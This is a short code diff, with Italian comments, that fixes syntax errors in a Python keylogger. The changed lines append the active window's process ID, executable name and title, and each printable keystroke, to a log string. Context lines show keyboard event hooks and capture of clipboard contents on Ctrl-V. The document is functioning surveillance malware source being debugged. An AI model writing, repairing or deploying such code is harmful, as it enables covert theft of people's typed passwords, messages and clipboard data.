@@ -64,7 +64,7 @@ def get_current_process():
     print ("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
     print
 
-    log += '\n[ PID: %s - %s - %s ]\n' % (process_id, executable.value, window_title.value))
+    log += '\n[ PID: %s - %s - %s ]\n' % (process_id, executable.value, window_title.value)
 
     # chiudiamo gli handler
     kernel32.CloseHandle(hwnd)
@@ -85,7 +85,7 @@ def KeyStroke(event):
     # se e' stato premuto un caratte standard lo stampiamo
     if event.Ascii > 32 and event.Ascii < 127:
         print (chr(event.Ascii), end='')
-        log += (chr(event.Ascii), end='')
+        log += chr(event.Ascii)
     else:
         # se [Ctrl-V], recupera il valore dagli appunti del sistema
         if event.Key == "V":
